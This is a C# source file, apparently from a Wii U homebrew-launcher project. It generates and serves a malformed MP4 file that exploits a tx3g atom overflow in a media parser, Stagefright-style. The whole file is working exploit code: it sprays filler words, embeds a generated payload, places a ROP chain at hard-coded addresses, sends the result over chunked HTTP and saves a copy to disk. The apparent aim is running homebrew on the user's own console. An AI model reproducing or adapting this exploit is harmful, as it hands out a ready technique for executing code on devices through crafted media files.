using System.IO;
using System.Text;
using Java.IO;
using Java.Lang;
using File = Java.IO.File;

namespace Offliine.Injection
{
    public class StageFright
    {
        public static bool Serve(OutputStream output, SystemVersion version, string payloadName)
        {
            var tx3GSize = 32768;
            //TODO(skettios): Add check for 5.3.2

            var tx3GRopStart = tx3GSize - 2048;
            var payloadSourceAddr = 341237032;

            var payloadStream = new ByteArrayOutputStream();

            var ropChain = RopChain.Generate(payloadSourceAddr - 4096, version, payloadSourceAddr);

            Util.WriteU32(24, payloadStream);
            Util.WriteU32(1718909296, payloadStream);
            Util.WriteU32(862416950, payloadStream);
            Util.WriteU32(256, payloadStream);
            Util.WriteU32(1769172845, payloadStream);
            Util.WriteU32(862409526, payloadStream);

            Util.WriteU32(tx3GSize + 4096, payloadStream);
            Util.WriteU32(1836019574, payloadStream);

            Util.WriteU32(108, payloadStream);
            Util.WriteU32(1677721600, payloadStream);
     
            payloadStream.Write(Util.ToArray("00000000C95B811AC95B811AFA0002580000022D000100000100000000000000000000000000FFFFF1000000000000000000000000010000000000000000000000000000400000000000000000000000000015696F6473000000001007004FFFFF2803FF"));
            
            Util.WriteU32(tx3GSize + 2048, payloadStream);
            Util.WriteU32(1953653099, payloadStream);

            Util.WriteU32(92, payloadStream);
            Util.WriteU32(1953196132, payloadStream);
            payloadStream.Write(Util.ToArray("00000001C95B811AC95B811A00000001000000000000022D000000000000000000000000010000000001000000000000000800000000000000010000000000000000000000000000400000000000100000000000"));

            Util.WriteU32(tx3GSize, payloadStream);
            Util.WriteU32(1954034535, payloadStream);

            for (var i = 0; i < tx3GSize - 8; i += 4)
            {
                if (i < 24576)
                {
                    if (i < 4096)
                    {
                        Util.WriteU32(1610612736, payloadStream);
                    }
                    else if (i < 20480)
                    {
                        var payload = Payload.Generate(version, payloadName);
                        payloadStream.Write(payload);
                        i += payload.Length - 4;
                        if (i + 4 >= 24576)
                            return false;

                        while (i + 4 < 20480)
                        {
                            Util.WriteU32(-1869574000, payloadStream);
                            i += 4;
                        }
                    }
                    else
                    {
                        Util.WriteU32(1482184792, payloadStream);
                    }
                }
                else if (i < tx3GRopStart)
                {
                    Util.WriteU32(version.Constants.PopjumplrStack12(), payloadStream);
                }
                else if (i == tx3GRopStart)
                {
                    Util.WriteU32(version.Constants.PopjumplrStack12(), payloadStream);
                    Util.WriteU32(1212696648, payloadStream);
                    i += 8;
                    payloadStream.Write(ropChain);
                    i += ropChain.Length - 4;
                }
                else
                {
                    Util.WriteU32(1212696648, payloadStream);
                }
            }

            Util.WriteU32(453, payloadStream);
            Util.WriteU32(1835297121, payloadStream);
            Util.WriteU32(1, payloadStream);
            Util.WriteU32(1954034535, payloadStream);
            Util.WriteU32(1, payloadStream);
            Util.WriteU32((int) (4294967296L - tx3GSize), payloadStream);

            for (int i = 0; i < 8192; i += 4)
                Util.WriteU32(-2070567244, payloadStream);

            var payloadBytes = payloadStream.ToByteArray();
            output.Write(Encoding.ASCII.GetBytes(Integer.ToHexString(payloadBytes.Length) + "\r\n"));
            output.Write(payloadBytes);
            output.Write(Encoding.ASCII.GetBytes("\r\n0\r\n\r\n"));

            var dumpFile = new File(MainActivity.ExternalStorage + "/Dump/" + version.PayloadVersion + "_" + payloadName + ".mp4");
            if (!dumpFile.ParentFile.Exists())
                dumpFile.ParentFile.Mkdir();

            var fos = new FileOutputStream(dumpFile);
            fos.Write(payloadBytes);
            fos.Close();

            return true;
        }
    }
}